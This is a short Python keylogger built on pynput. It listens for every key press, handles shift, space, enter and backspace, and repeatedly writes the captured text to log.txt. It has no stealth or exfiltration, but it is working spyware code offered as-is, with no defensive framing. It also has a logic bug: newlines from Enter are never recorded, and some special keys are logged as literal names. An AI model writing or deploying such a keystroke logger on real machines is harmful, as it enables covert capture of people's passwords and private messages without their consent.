from pynput.keyboard import Listener

typed_text = ""

def writetofile(key):
    global typed_text

    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.shift' or letter == 'Key.shift_r' or letter == "Key.ctrl_l" :
        letter = ''
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.backspace':
        # Deleting the last character from typed_text
        typed_text = typed_text[:-1]
        letter = ''
    else:
        typed_text += letter

    # Write updated text to the file
    with open('log.txt', 'w') as f:
        f.write(typed_text)

with Listener(on_press=writetofile) as l:
    l.join()
